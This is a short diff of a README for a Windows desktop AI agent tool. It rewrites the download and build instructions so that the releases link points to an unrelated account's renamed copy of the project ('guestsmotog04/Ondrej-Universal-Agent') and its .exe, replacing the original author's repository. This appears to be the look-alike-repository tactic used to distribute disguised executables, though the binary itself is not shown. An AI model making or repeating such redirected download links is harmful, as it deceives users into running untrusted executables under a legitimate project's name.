@@ -171,8 +171,8 @@ This application executes real, unauthenticated OS-level input events. Do not ex
 # Setup & Usage Instructions
 
 ### How to Download
-1.  Go to the [Releases](https://github.com/ThioJoe/Thio-Universal-Agent/releases) page.
-2.  For the latest release, look under `Assets` and download `Thio-Universal-Agent.exe`.
+1.  Go to the [Releases](https://github.com/guestsmotog04/Ondrej-Universal-Agent/releases) page.
+2.  For the latest release, look under `Assets` and download `Ondrej-Universal-Agent.exe`.
 
 ### Usage Instructions
 
@@ -201,7 +201,7 @@ Note: You'll need to add your own API key for your AI of choice. I'll add local 
 
 ### Instructions:
 
-1. Open the solution file (`Thio-Universal-Agent.slnx`) in Visual Studio 2026.
+1. Open the solution file (`Ondrej-Universal-Agent.slnx`) in Visual Studio 2026.
 2. Select your desired build configuration (`Debug` or `Release`).
 3. Compile and run the solution.
 
